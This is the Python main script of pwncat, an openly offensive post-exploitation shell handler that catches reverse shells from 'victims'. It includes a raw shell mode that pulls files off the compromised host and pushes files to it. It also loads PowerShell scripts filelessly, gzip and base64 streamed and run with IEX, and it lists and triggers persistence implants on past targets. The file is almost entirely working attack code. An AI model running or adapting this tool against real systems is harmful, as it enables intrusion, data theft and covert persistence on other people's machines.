#!/usr/bin/env python3
import sys
import logging
import argparse
import importlib.metadata

from rich import box
from rich.table import Table
from rich.progress import Progress, SpinnerColumn

import pwncat.manager
from pwncat.util import console
from pwncat.channel import ChannelError
from pwncat.modules import ModuleFailed
from pwncat.commands import connect
from pwncat.platform import PlatformError


def _build_raw_channel(query_args):
    """Construct and connect a channel WITHOUT bootstrapping a platform.

    Used by raw passthrough mode. For ``bind`` channels this performs the
    ``accept()``; for ``connect`` channels the socket is connected in the
    constructor and ``connect()`` is a no-op.
    """

    import pwncat.channel

    keys = ("protocol", "host", "port", "certfile", "keyfile", "ssl")
    kwargs = {k: query_args[k] for k in keys if query_args.get(k) is not None}

    channel = pwncat.channel.create(**kwargs)
    channel.connect()
    return channel


def raw_interact(manager, channel, reason=None):
    """Relay an already-connected channel directly to the local terminal,
    netcat-style, with no platform bootstrap.

    This guarantees a caught shell is never lost. When pwncat cannot
    bootstrap a platform around a connection -- e.g. a Windows PowerShell or
    cmd.exe reverse shell that the Windows C2 cannot drive, or any shell that
    does not behave like the expected platform -- we still hand the operator
    a working interactive shell over the raw channel instead of closing the
    connection.
    """

    import os
    import gzip
    import time
    import base64
    import select
    import hashlib
    import secrets
    import readline

    from pwncat.channel import ChannelClosed

    if reason:
        console.log(f"[yellow]{reason}[/yellow]")
    console.log(
        "[green]raw shell[/green]: line-mode passthrough with history, tab-complete, "
        "file transfer, and in-memory script loading. [cyan]Tab[/cyan]=complete, "
        "[cyan]:help[/cyan]=local commands ([cyan]:download[/cyan]/[cyan]:upload[/cyan]/"
        "[cyan]:load[/cyan]/[cyan]:run[/cyan]), [cyan]Ctrl-D[/cyan]=disconnect.",
    )

    sock_fd = channel.fileno()

    # --- readline: persistent history + history-based tab completion ---
    # The terminal stays in normal (cooked) mode and readline owns the input
    # line, giving the operator history (Up/Down), editing, and Tab completion
    # even though the remote is a dumb line-based shell. We send a full line
    # only on Enter, which is exactly what a PowerShell `iex` loop or piped
    # `cmd.exe`/`/bin/sh` expects (sending raw keystrokes makes them run each
    # character as its own command).
    histfile = os.path.expanduser("~/.local/share/pwncat/raw_history")
    try:
        os.makedirs(os.path.dirname(histfile), exist_ok=True)
        readline.read_history_file(histfile)
    except OSError:
        pass
    readline.set_history_length(2000)

    # Detect shell family from the prompt so completion uses the right query.
    # (PowerShell prompts look like ``PS C:\...>``; cmd.exe like ``C:\...>``.)
    shell_kind = {"value": "powershell"}

    def _drain_idle(idle: float = 0.5, hard: float = 3.0):
        """Read and discard pending socket data until idle. Used to consume a
        completion query's echo/output so it doesn't corrupt the next prompt."""
        buf = b""
        end = time.time() + hard
        timeout = idle
        while time.time() < end:
            try:
                ready, _, _ = select.select([sock_fd], [], [], timeout)
            except InterruptedError:
                continue
            if not ready:
                break
            try:
                data = channel.recv(4096)
            except ChannelClosed:
                break
            if not data:
                break
            buf += data
        return buf

    def _remote_names(prefix: str):
        """Synchronously ask the victim for filesystem names matching ``prefix``.

        Safe to call from the readline completer: we are parked at the input
        prompt, so the socket is otherwise idle. A unique marker brackets the
        output so we can slice exactly the listing. Any leftover output (incl.
        the prompt the command elicits) is drained so the session stays in
        sync. Returns a list of names, or [] on any error/timeout."""

        marker = "PWN" + secrets.token_hex(4)
        # -Name returns bare names; the wildcard filters by prefix; errors are
        # suppressed so a bad path simply yields nothing.
        safe = prefix.replace('"', "")
        if shell_kind["value"] == "cmd":
            query = f'dir /b "{safe}*" 2>nul & echo {marker}\r\n'
        else:
            query = f'Get-ChildItem -Name "{safe}*" 2>$null;Write-Output {marker}\n'

        try:
            # Clear anything stale, then send the query.
            _drain_idle(idle=0.1, hard=0.3)
            channel.send(query.encode("utf-8", "replace"))
        except ChannelClosed:
            return []

        buf = b""
        end = time.time() + 4.0
        mk = marker.encode()
        while mk not in buf and time.time() < end:
            try:
                ready, _, _ = select.select([sock_fd], [], [], 0.3)
            except InterruptedError:
                continue
            if not ready:
                continue
            try:
                data = channel.recv(4096)
            except ChannelClosed:
                break
            if not data:
                break
            buf += data

        # Drain the trailing prompt the query produced, so it isn't shown twice.
        _drain_idle(idle=0.3, hard=1.5)

        # Slice output strictly before the marker, drop echo/noise lines.
        body = buf.split(mk)[0]
        names = []
        ql = query.strip().lower()
        for raw in body.replace(b"\r\n", b"\n").split(b"\n"):
            line = raw.strip()
            if not line:
                continue
            low = line.lower()
            if low in (ql, b"get-childitem", b"dir"):
                continue
            if b"get-childitem" in low or low.startswith(b"dir "):
                continue  # the echoed command line
            text = line.decode("utf-8", "replace")
            # Skip a leaked prompt fragment, just in case.
            if text.endswith(">") and (":\\" in text or text.startswith("PS ")):
                continue
            names.append(text)
        return names

    def _completer(text, state):
        # On the first request for this prefix, build the candidate list:
        # remote filesystem names first, then matching history entries.
        if state == 0:
            matches = []
            try:
                for name in _remote_names(text):
                    if name not in matches:
                        matches.append(name)
            except Exception:
                pass
            for i in range(1, readline.get_current_history_length() + 1):
                item = readline.get_history_item(i)
                if item and item.startswith(text) and item not in matches:
                    matches.append(item)
            _completer.cache = matches
        try:
            return _completer.cache[state]
        except (IndexError, AttributeError):
            return None

    _completer.cache = []

    readline.set_completer(_completer)
    # Break the line on whitespace so we complete the LAST token (a path/name),
    # not the whole line -- e.g. ``type inde<Tab>`` completes ``inde``.
    readline.set_completer_delims(" \t")
    readline.parse_and_bind("tab: complete")

    # ----------------------- file transfer helpers -----------------------
    # File transfer over a dumb shell: move bytes as base64 text through the
    # shell itself. Download = victim base64-encodes a file and we decode it
    # locally; upload = we base64 locally, stream it to a remote variable in
    # ack'd chunks, then have the victim decode it to disk. Works without the
    # C2. PowerShell shells run the commands directly; cmd.exe shells get them
    # wrapped in ``powershell -nop -c`` (PowerShell is present on modern
    # Windows), so transfer works from either.

    def _xfer_recv_until(marker: bytes, timeout: float):
        buf = b""
        end = time.time() + timeout
        while marker not in buf and time.time() < end:
            try:
                ready, _, _ = select.select([sock_fd], [], [], 0.3)
            except InterruptedError:
                continue
            if not ready:
                continue
            try:
                data = channel.recv(65536)
            except ChannelClosed:
                break
            if not data:
                break
            buf += data
        return buf

    def _xfer_settle(idle: float = 0.4, hard: float = 3.0):
        end = time.time() + hard
        while time.time() < end:
            try:
                ready, _, _ = select.select([sock_fd], [], [], idle)
            except InterruptedError:
                continue
            if not ready:
                break
            try:
                if not channel.recv(65536):
                    break
            except ChannelClosed:
                break

    def _ps_line(ps: str) -> bytes:
        """Wrap a PowerShell snippet appropriately for the detected shell."""
        if shell_kind["value"] == "cmd":
            return ('powershell -nop -c "' + ps.replace('"', '\\"') + '"\n').encode(
                "utf-8", "replace",
            )
        return (ps + "\n").encode("utf-8", "replace")

    def _download(remote: str, local: str) -> bool:
        mk = "PD" + secrets.token_hex(4)
        rp = remote.replace("'", "''")
        ps = (
            f"$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('{rp}'));"
            f"Write-Output '{mk}S';Write-Output $b;Write-Output '{mk}E'"
        )
        try:
            _xfer_settle(0.1, 0.3)
            channel.send(_ps_line(ps))
        except ChannelClosed:
            console.log("[red]download failed[/red]: connection closed")
            return False
        buf = _xfer_recv_until((mk + "E").encode(), timeout=60.0)
        _xfer_settle(0.3, 2.0)
        try:
            body = buf.split((mk + "S").encode(), 1)[1].split((mk + "E").encode(), 1)[0]
            data = base64.b64decode("".join(body.decode("utf-8", "replace").split()))
        except Exception:
            tail = buf.decode("utf-8", "replace").strip().splitlines()[-3:]
            console.log("[red]download failed[/red] (file missing or not readable). "
                        f"remote said: {' '.join(tail)[:160]}")
            return False
        try:
            with open(os.path.expanduser(local), "wb") as fp:
                fp.write(data)
        except OSError as exc:
            console.log(f"[red]download failed[/red]: cannot write {local}: {exc}")
            return False
        console.log(
            f"[green]downloaded[/green] {len(data)} bytes -> {local} "
            f"(md5 {hashlib.md5(data).hexdigest()})",
        )
        return True

    def _upload(local: str, remote: str) -> bool:
        try:
            with open(os.path.expanduser(local), "rb") as fp:
                data = fp.read()
        except OSError as exc:
            console.log(f"[red]upload failed[/red]: cannot read {local}: {exc}")
            return False

        b64 = base64.b64encode(data).decode()
        rp = remote.replace("'", "''")
        mk = "PU" + secrets.token_hex(4)

        try:
            _xfer_settle(0.1, 0.3)
            channel.send(_ps_line(f"$u='';Write-Output '{mk}i'"))
            _xfer_recv_until((mk + "i").encode(), timeout=10.0)
            _xfer_settle(0.2, 1.0)

            chunk = 1200
            total = (len(b64) + chunk - 1) // chunk
            for idx, off in enumerate(range(0, len(b64), chunk), start=1):
                part = b64[off:off + chunk]
                channel.send(_ps_line(f"$u+='{part}';Write-Output '{mk}{idx}'"))
                _xfer_recv_until((mk + str(idx)).encode(), timeout=15.0)
                _xfer_settle(0.05, 0.5)
                if idx == 1 or idx % 10 == 0 or idx == total:
                    sys.stdout.write(f"\r  uploading… chunk {idx}/{total}")
                    sys.stdout.flush()
            sys.stdout.write("\n")

            ps = (
                f"[IO.File]::WriteAllBytes('{rp}',[Convert]::FromBase64String($u));"
                f"$h=(Get-FileHash '{rp}' -Algorithm MD5).Hash;"
                f"$s=(Get-Item '{rp}').Length;Write-Output \"{mk}R $s $h\""
            )
            channel.send(_ps_line(ps))
            buf = _xfer_recv_until((mk + "R").encode(), timeout=30.0)
            _xfer_settle(0.3, 2.0)
        except ChannelClosed:
            console.log("[red]upload failed[/red]: connection closed")
            return False

        import re as _re

        m = _re.search((mk + r"R (\d+) ([0-9A-Fa-f]+)").encode(), buf)
        if not m:
            console.log("[red]upload failed[/red]: remote could not write the file")
            return False
        rsize = int(m.group(1))
        rhash = m.group(2).decode().lower()
        local_md5 = hashlib.md5(data).hexdigest()
        if rsize == len(data) and rhash == local_md5:
            console.log(
                f"[green]uploaded[/green] {len(data)} bytes -> {remote} "
                f"(md5 {local_md5}, verified)",
            )
            return True
        console.log(
            f"[red]upload integrity MISMATCH[/red]: local {len(data)}B/{local_md5[:12]} "
            f"vs remote {rsize}B/{rhash[:12]}",
        )
        return False

    def _load_script(localfile: str, run_cmd: str = None):
        """Load a local PowerShell script into the live session entirely in
        memory (no disk on the victim): gzip + base64 it, stream it in
        integrity-checked chunks, decompress on the victim, and ``IEX`` it so
        its functions are defined in the current runspace. Returns "read" if a
        follow-up command was sent (caller should stream its output), "reuse"
        on a plain load, or False on failure.

        Requires a PowerShell shell (the load must run in the same runspace the
        operator is typing into, so functions persist and are callable)."""

        if shell_kind["value"] != "powershell":
            console.log(
                "[red]:load needs a PowerShell shell[/red] (this looks like "
                "cmd.exe). In-memory loading must run in the interactive "
                "runspace; catch a PowerShell reverse shell to use it.",
            )
            return False
        try:
            with open(os.path.expanduser(localfile), "rb") as fp:
                raw = fp.read()
        except OSError as exc:
            console.log(f"[red]:load failed[/red]: cannot read {localfile}: {exc}")
            return False

        comp = gzip.compress(raw, 9)
        b64 = base64.b64encode(comp).decode()
        comp_md5 = hashlib.md5(comp).hexdigest()
        name = os.path.basename(localfile)
        mk = "PL" + secrets.token_hex(4)

        try:
            _xfer_settle(0.1, 0.3)
            channel.send(f"$b='';Write-Output '{mk}i'\n".encode())
            _xfer_recv_until((mk + "i").encode(), timeout=10.0)
            _xfer_settle(0.15, 1.0)

            chunk = 1200
            total = (len(b64) + chunk - 1) // chunk
            for idx, off in enumerate(range(0, len(b64), chunk), start=1):
                channel.send(
                    f"$b+='{b64[off:off + chunk]}';Write-Output '{mk}{idx}'\n".encode(),
                )
                _xfer_recv_until((mk + str(idx)).encode(), timeout=15.0)
                _xfer_settle(0.03, 0.4)
                if idx == 1 or idx % 20 == 0 or idx == total:
                    sys.stdout.write(f"\r  loading {name}… chunk {idx}/{total}")
                    sys.stdout.flush()
            sys.stdout.write("\n")

            # Verify compressed bytes, then gunzip to the script text in $s.
            ps = (
                "$c=[Convert]::FromBase64String($b);"
                "$h=[BitConverter]::ToString([Security.Cryptography.MD5]::Create()"
                ".ComputeHash($c)).Replace('-','');"
                "$ms=New-Object IO.MemoryStream(,$c);"
                "$gz=New-Object IO.Compression.GzipStream($ms,"
                "[IO.Compression.CompressionMode]::Decompress);"
                "$sr=New-Object IO.StreamReader($gz,[Text.Encoding]::UTF8);"
                "$s=$sr.ReadToEnd();$sr.Close();"
                f"Write-Output \"{mk}V $h $($s.Length)\""
            )
            channel.send((ps + "\n").encode())
            buf = _xfer_recv_until((mk + "V").encode(), timeout=30.0)
            _xfer_settle(0.3, 2.0)
        except ChannelClosed:
            console.log("[red]:load failed[/red]: connection closed")
            return False

        import re as _re

        m = _re.search((mk + r"V ([0-9A-Fa-f]+) (\d+)").encode(), buf)
        if not m or m.group(1).decode().lower() != comp_md5:
            console.log(
                "[red]:load failed[/red]: transfer integrity check failed "
                "(try again)",
            )
            return False

        # Execute the script in the interactive runspace so functions persist.
        try:
            channel.send(f"IEX $s;Write-Output '{mk}X'\n".encode())
            _xfer_recv_until((mk + "X").encode(), timeout=30.0)
            _xfer_settle(0.3, 2.0)
        except ChannelClosed:
            console.log("[red]:load failed[/red]: connection closed during exec")
            return False

        console.log(
            f"[green]loaded[/green] {name} ({len(raw)} bytes) in-memory, verified. "
            "Its functions are now callable.",
        )

        if run_cmd:
            # Send the follow-up command and let the main loop stream its
            # output (return "read" so the caller does read_response()).
            try:
                channel.send((run_cmd + "\n").encode("utf-8", "replace"))
            except ChannelClosed:
                return False
            return "read"
        return "reuse"

    def _local_command(line: str):
        """Handle a ``:`` local command. Returns True if it was handled (and
        must not be forwarded to the victim)."""
        if not line.startswith(":"):
            return False
        parts = line[1:].split()
        if not parts:
            return True
        cmd, args = parts[0].lower(), parts[1:]

        if cmd in ("help", "h", "?"):
            console.log(
                "local commands:\n"
                "  :download <remote> [local]   pull a file from the victim\n"
                "  :upload   <local> [remote]   push a file to the victim\n"
                "  :psh      <command>          run a PowerShell command (works\n"
                "                               from a cmd shell; bare 'powershell'\n"
                "                               hangs over a pipe -- use this)\n"
                "  :load     <local.ps1>        load a PS script in-memory (IEX)\n"
                "  :run      <local.ps1> [cmd]  load it, then run [cmd] (e.g. a\n"
                "                               function it defines) and show output\n"
                "  :help                        this help\n"
                "  :exit / Ctrl-D               disconnect\n"
                "(transfer/load use base64 over the shell -- no C2, no disk for "
                ":load. :load/:run need a PowerShell shell.)",
            )
            return "reuse"
        if cmd in ("exit", "quit", "q"):
            raise EOFError
        if cmd in ("download", "dl", "get"):
            if not args:
                console.log("usage: :download <remote-path> [local-path]")
                return "reuse"
            remote = args[0]
            local = args[1] if len(args) > 1 else os.path.basename(
                remote.replace("\\", "/"),
            )
            _download(remote, local)
            return "reuse"
        if cmd in ("upload", "ul", "put"):
            if not args:
                console.log("usage: :upload <local-path> [remote-path]")
                return "reuse"
            local = args[0]
            remote = args[1] if len(args) > 1 else os.path.basename(local)
            _upload(local, remote)
            return "reuse"
        if cmd in ("psh", "ps"):
            if len(line.split(None, 1)) < 2:
                console.log("usage: :psh <powershell command>")
                return "reuse"
            pscmd = line.split(None, 1)[1]
            if shell_kind["value"] == "powershell":
                wire = pscmd
            else:
                # From cmd.exe: run a one-shot PowerShell that flushes its
                # output on exit (a bare interactive `powershell` over a pipe
                # buffers forever and never returns output).
                wire = 'powershell -NoProfile -Command "' + pscmd.replace('"', '\\"') + '"'
            try:
                channel.send((wire + "\n").encode("utf-8", "replace"))
            except ChannelClosed:
                return "reuse"
            return "read"
        if cmd in ("load", "source"):
            if not args:
                console.log("usage: :load <local-script.ps1>")
                return "reuse"
            result = _load_script(args[0])
            return result if result else "reuse"
        if cmd in ("run", "exec"):
            if not args:
                console.log("usage: :run <local-script.ps1> [command to run]")
                return "reuse"
            run_cmd = " ".join(args[1:]) if len(args) > 1 else None
            result = _load_script(args[0], run_cmd=run_cmd)
            return result if result else "reuse"

        console.log(f"unknown local command: :{cmd} (try :help)")
        return "reuse"

    def _looks_like_prompt(buf: bytes) -> bool:
        """Heuristic: does the held-back tail look like a shell prompt? Covers
        cmd (``C:\\...>``), PowerShell (``PS C:\\...>``) and POSIX (``$``/``#``)."""
        t = buf.rstrip()
        return bool(t) and t[-1:] in (b">", b"$", b"#", b"%")

    def read_response(
        first_timeout: float = 30.0,
        prompt_idle: float = 0.35,
        busy_idle: float = 2.5,
    ):
        """Stream victim output to our stdout, holding back the trailing
        (unterminated) line which is normally the next prompt. Returns
        (prompt, closed).

        The idle wait is adaptive: once the held-back tail already looks like a
        prompt we return quickly (``prompt_idle``); if it does NOT look like a
        prompt we wait much longer (``busy_idle``) because output is probably
        still coming -- e.g. a slow command, a high-latency host, or a sub-shell
        (``powershell``) taking seconds to start. This stops us from returning a
        bogus prompt mid-operation and eating the operator's next keystrokes."""

        tail = getattr(channel, "peek_buffer", b"") or b""
        if tail:
            channel.peek_buffer = b""
        got_data = bool(tail)
        while True:
            if not got_data:
                timeout = first_timeout
            elif _looks_like_prompt(tail):
                timeout = prompt_idle
            else:
                timeout = busy_idle
            try:
                ready, _, _ = select.select([sock_fd], [], [], timeout)
            except InterruptedError:
                continue
            if not ready:
                return tail, False
            try:
                data = channel.recv(4096)
            except ChannelClosed:
                return tail, True
            if not data:
                return tail, True
            got_data = True
            tail += data
            nl = tail.rfind(b"\n")
            if nl >= 0:
                sys.stdout.buffer.write(tail[: nl + 1])
                sys.stdout.buffer.flush()
                tail = tail[nl + 1 :]

    # Nudge silent shells (e.g. Nishang loops) so we get an initial prompt --
    # unless detection already elicited one (left in peek_buffer).
    if not (getattr(channel, "peek_buffer", b"") or b""):
        try:
            channel.send(b"\n")
        except ChannelClosed:
            pass

    last_prompt = ""
    # After a local ``:`` command we must NOT call read_response() again: the
    # command already consumed the victim's prompt, so there is no new output
    # coming and read_response would block for its full timeout (during which
    # Ctrl-C would tear down the session). Instead we reuse the last prompt --
    # the victim is idle at it, since local commands don't change remote state.
    reuse_prompt = False

    try:
        while True:
            if reuse_prompt:
                reuse_prompt = False
                prompt = last_prompt
                closed = False
            else:
                try:
                    prompt_bytes, closed = read_response()
                except KeyboardInterrupt:
                    # Ctrl-C while waiting for output: return to the prompt
                    # instead of tearing down the session.
                    sys.stdout.write("\n")
                    prompt = last_prompt
                    closed = False
                else:
                    prompt = prompt_bytes.decode("utf-8", "replace")
                    last_prompt = prompt

            # Track shell family from the live prompt so completion picks the
            # right query. A cmd.exe prompt is ``C:\...>`` with no "PS" prefix.
            pl = prompt.strip()
            if pl.endswith(">") and ":\\" in pl and not pl.upper().startswith("PS"):
                shell_kind["value"] = "cmd"
            elif pl.upper().startswith("PS"):
                shell_kind["value"] = "powershell"

            if closed:
                if prompt:
                    sys.stdout.write(prompt)
                    sys.stdout.flush()
                console.log("\n[yellow]connection closed by remote host[/yellow]")
                break

            try:
                line = input(prompt)
            except EOFError:        # Ctrl-D
                break
            except KeyboardInterrupt:  # Ctrl-C cancels the current line
                sys.stdout.write("\n")
                continue

            try:
                readline.write_history_file(histfile)
            except OSError:
                pass

            # Intercept local ``:`` commands (file transfer, help) so they run
            # here instead of being sent to the victim.
            try:
                result = _local_command(line)
                if result:
                    # "reuse": command consumed its own output and left the
                    # victim idle at its prompt -> reuse it (don't block in
                    # read_response). "read": command sent a follow-up to the
                    # victim -> fall through to read_response to stream output.
                    reuse_prompt = result != "read"
                    continue
            except EOFError:
                break

            # Guard the footgun: a bare interactive PowerShell launched over a
            # pipe buffers its output forever and shows no prompt, hanging the
            # session (plain nc does the same -- it's PowerShell's redirected-IO
            # behavior, not something we can fix by sending it). Warn and don't
            # send; point at :psh, which runs PowerShell commands that work.
            if line.strip().lower() in (
                "powershell", "powershell.exe", "pwsh", "pwsh.exe",
            ):
                console.log(
                    "[yellow]heads up[/yellow]: a bare interactive "
                    f"[cyan]{line.strip()}[/cyan] over a pipe hangs -- it buffers "
                    "output and shows no prompt (nc behaves the same). Not sent.\n"
                    "  * run PowerShell commands with [cyan]:psh <command>[/cyan]\n"
                    "  * load scripts in-memory with [cyan]:load[/cyan] / [cyan]:run[/cyan]\n"
                    "  * for a full interactive PowerShell, catch a PowerShell "
                    "reverse shell directly",
                )
                reuse_prompt = True
                continue

            try:
                channel.send(line.encode("utf-8", "replace") + b"\n")
            except ChannelClosed:
                console.log("\n[yellow]connection closed by remote host[/yellow]")
                break
    finally:
        try:
            channel.close()
        except Exception:
            pass


def main():

    # Default log-level is "INFO"
    logging.getLogger().setLevel(logging.INFO)

    parser = argparse.ArgumentParser(
        description="""Start interactive pwncat session and optionally connect to existing victim via a known platform and channel type. This entrypoint can also be used to list known implants on previous targets.""",
    )
    parser.add_argument(
        "--version", "-v", action="store_true", help="Show version number and exit",
    )
    parser.add_argument(
        "--download-plugins",
        action="store_true",
        help="Pre-download all Windows builtin plugins and exit immediately",
    )
    parser.add_argument(
        "--config",
        "-c",
        type=argparse.FileType("r"),
        default=None,
        help="Custom configuration file (default: ./pwncatrc)",
    )
    parser.add_argument("--ssl", action="store_true", help="Connect or listen with SSL")
    parser.add_argument(
        "--ssl-cert",
        default=None,
        help="Certificate for SSL-encrypted listeners (PEM)",
    )
    parser.add_argument(
        "--ssl-key",
        default=None,
        help="Key for SSL-encrypted listeners (PEM)",
    )
    parser.add_argument(
        "--identity",
        "-i",
        type=argparse.FileType("r"),
        default=None,
        help="Private key for SSH authentication",
    )
    parser.add_argument(
        "--listen",
        "-l",
        action="store_true",
        help="Enable the `bind` protocol (supports netcat-style syntax)",
    )
    parser.add_argument(
        "--raw",
        "-r",
        action="store_true",
        help="Catch the connection as a raw passthrough shell (netcat-style) "
        "without platform bootstrapping. Use for Windows or unusual shells. "
        "pwncat also falls back to this automatically if platform bootstrap fails.",
    )
    parser.add_argument(
        "--platform",
        "-m",
        help="Name of the platform to use (default: linux)",
        default="linux",
    )
    parser.add_argument(
        "--port",
        "-p",
        help="Alternative way to specify port to support netcat-style syntax",
    )
    parser.add_argument(
        "--list",
        action="store_true",
        help="List installed implants with remote connection capability",
    )
    parser.add_argument(
        "connection_string",
        metavar="[protocol://][user[:password]@][host][:port]",
        help="Connection string describing victim",
        nargs="?",
    )
    parser.add_argument(
        "pos_port",
        nargs="?",
        metavar="port",
        help="Alternative port number to support netcat-style syntax",
    )
    parser.add_argument(
        "--verbose",
        "-V",
        action="store_true",
        help="Enable verbose output for the remote commands executed by `pwncat`",
    )
    args = parser.parse_args()

    # Print the version number and exit.
    if args.version:
        print(importlib.metadata.version("pwncat-vl"))
        return

    # Create the session manager
    with pwncat.manager.Manager(args.config) as manager:

        if args.verbose:
            # set the config variable `verbose` to `True` (globally)
            manager.config.set("verbose", True, True)

        if args.download_plugins:
            for plugin_info in pwncat.platform.Windows.PLUGIN_INFO:
                with pwncat.platform.Windows.open_plugin(
                    manager, plugin_info.provides[0],
                ):
                    pass

            return

        if args.list:

            db = manager.db.open()
            implants = []

            table = Table(
                "ID",
                "Address",
                "Platform",
                "Implant",
                "User",
                box=box.MINIMAL_DOUBLE_HEAD,
            )

            # Locate all installed implants
            for target in db.root.targets:

                # Collect users
                users = {}
                for fact in target.facts:
                    if "user" in fact.types:
                        users[fact.id] = fact

                # Collect implants
                for fact in target.facts:
                    if "implant.remote" in fact.types:
                        table.add_row(
                            target.guid,
                            target.public_address[0],
                            target.platform,
                            fact.source,
                            users[fact.uid].name,
                        )

            if not table.rows:
                console.log("[red]error[/red]: no remote implants found")
            else:
                console.print(table)

            return

        console.log("Welcome to [red]pwncat[/red] 🐈!")

        if (
            args.connection_string is not None
            or args.pos_port is not None
            or args.port is not None
            or args.listen
            or args.identity is not None
        ):
            query_args = {}
            query_args["protocol"] = None
            query_args["user"] = None
            query_args["password"] = None
            query_args["host"] = None
            query_args["port"] = None
            query_args["platform"] = args.platform
            query_args["certfile"] = args.ssl_cert
            query_args["keyfile"] = args.ssl_key
            query_args["ssl"] = args.ssl
            querystring = None

            if args.identity is not None:
                try:
                    import paramiko

                    if not hasattr(paramiko, "load_private_key"):
                        console.log(
                            "[red]error[/red]: incompatible paramiko detected; "
                            "install [blue]paramiko-ng[/blue] instead of [blue]paramiko[/blue]",
                        )
                        return
                except ImportError:
                    pass
            query_args["identity"] = args.identity

            if args.connection_string:
                m = connect.Command.CONNECTION_PATTERN.match(args.connection_string)
                query_args["protocol"] = m.group("protocol")
                query_args["user"] = m.group("user")
                query_args["password"] = m.group("password")
                query_args["host"] = m.group("host")
                query_args["port"] = m.group("port")
                querystring = m.group("querystring")

                if query_args["protocol"] is not None:
                    query_args["protocol"] = query_args["protocol"].removesuffix("://")

                if query_args["password"] is not None:
                    query_args["password"] = query_args["password"].removeprefix(":")

            if querystring is not None:
                for arg in querystring.split("&"):
                    if arg.find("=") == -1:
                        continue

                    key, *value = arg.split("=")

                    if key in query_args and query_args[key] is not None:
                        console.log(f"[red]error[/red]: multiple values for {key}")
                        return

                    query_args[key] = "=".join(value)

            if query_args["host"] is not None and query_args["host"] == "":
                query_args["host"] = None

            if query_args["protocol"] is not None and args.listen:
                console.log(
                    "[red]error[/red]: --listen is not compatible with an explicit connection string",
                )
                return
            if args.listen:
                query_args["protocol"] = "bind"

            if (
                query_args["certfile"] is None and query_args["keyfile"] is not None
            ) or (query_args["certfile"] is not None and query_args["keyfile"] is None):
                console.log(
                    "[red]error[/red]: both a ssl certificate and key file are required",
                )
                return

            if query_args["certfile"] is not None or query_args["keyfile"] is not None:
                query_args["ssl"] = True

            if query_args["protocol"] not in [
                None,
                "bind",
                "connect",
            ] and query_args.get("ssl"):
                console.log(
                    f"[red]error[/red]: --ssl is incompatible with an [yellow]{query_args['protocol']}[/yellow] protocol",
                )
                return
            if query_args["protocol"] is not None and query_args.get("ssl"):
                query_args["protocol"] = "ssl-" + query_args["protocol"]

            if (
                sum(
                    [
                        query_args["port"] is not None,
                        args.port is not None,
                        args.pos_port is not None,
                    ],
                )
                > 1
            ):
                console.log("[red]error[/red]: multiple ports specified")
                return

            if args.port is not None:
                query_args["port"] = args.port
            if args.pos_port is not None:
                query_args["port"] = args.pos_port

            if query_args["port"] is not None:
                try:
                    query_args["port"] = int(query_args["port"].lstrip(":"))
                except ValueError:
                    console.log(
                        f"[red]error[/red]: {query_args['port'].lstrip(':')}: invalid port number",
                    )
                    return

            # Attempt to reconnect via installed implants
            if (
                query_args["protocol"] is None
                and query_args["password"] is None
                and query_args["port"] is None
                and args.identity is None
            ):
                db = manager.db.open()
                implants = []

                # Locate all installed implants
                for target in db.root.targets:

                    if (
                        target.guid != query_args["host"]
                        and target.public_address[0] != query_args["host"]
                    ):
                        continue

                    # Collect users
                    users = {}
                    for fact in target.facts:
                        if "user" in fact.types:
                            users[fact.id] = fact

                    # Collect implants
                    for fact in target.facts:
                        if "implant.remote" in fact.types:
                            implants.append((target, users[fact.uid], fact))

                for target, implant_user, implant in implants:
                    # Check correct query_args["user"]
                    if (
                        query_args["user"] is not None
                        and implant_user.name != query_args["user"]
                    ):
                        continue
                    # Check correct platform
                    if (
                        query_args["platform"] is not None
                        and target.platform != query_args["platform"]
                    ):
                        continue

                    manager.log(f"trigger implant: [cyan]{implant.source}[/cyan]")

                    # Attempt to trigger a new session
                    try:
                        session = implant.trigger(manager, target)
                        manager.target = session
                        used_implant = implant
                        break
                    except ModuleFailed:
                        db.transaction_manager.commit()
                        continue

            if manager.target is not None:
                manager.target.log(
                    f"connected via {used_implant.title(manager.target)}",
                )
            elif args.raw:
                # Explicit raw passthrough: skip platform bootstrap entirely
                # and relay the connection directly to the terminal.
                try:
                    channel = _build_raw_channel(query_args)
                    raw_interact(manager, channel)
                    return
                except ChannelError as exc:
                    manager.log(f"connection failed: {exc}")
                except KeyboardInterrupt:
                    sys.stdout.write("\b\b\r")
                    manager.log("[yellow]warning[/yellow]: cancelled by user")
            else:
                try:
                    manager.create_session(
                        **query_args,
                    )
                except (ChannelError, PlatformError) as exc:
                    # Never lose a caught shell: if the failure carries a
                    # still-connected channel (e.g. a Windows reverse shell the
                    # C2 could not bootstrap), fall back to a raw passthrough
                    # relay instead of dropping the connection.
                    channel = getattr(exc, "channel", None)
                    if channel is not None and getattr(channel, "connected", False):
                        raw_interact(
                            manager,
                            channel,
                            reason=f"platform bootstrap failed: {exc}",
                        )
                        return
                    manager.log(f"connection failed: {exc}")
                except KeyboardInterrupt:
                    # hide '^C' from the output
                    sys.stdout.write("\b\b\r")
                    manager.log("[yellow]warning[/yellow]: cancelled by user")

        manager.interactive()

        if manager.sessions:
            with Progress(
                SpinnerColumn(),
                "closing sessions",
                "•",
                "{task.fields[status]}",
                console=console,
                transient=True,
            ) as progress:
                task = progress.add_task("task", status="...")

                # Retrieve the existing session IDs list
                session_ids = list(manager.sessions.keys())

                # Close each session based on its ``session_id``
                for session_id in session_ids:
                    progress.update(
                        task, status=str(manager.sessions[session_id].platform),
                    )
                    manager.sessions[session_id].close()

                progress.update(task, status="done!", completed=100)


if __name__ == "__main__":

    main()

    sys.exit(0)
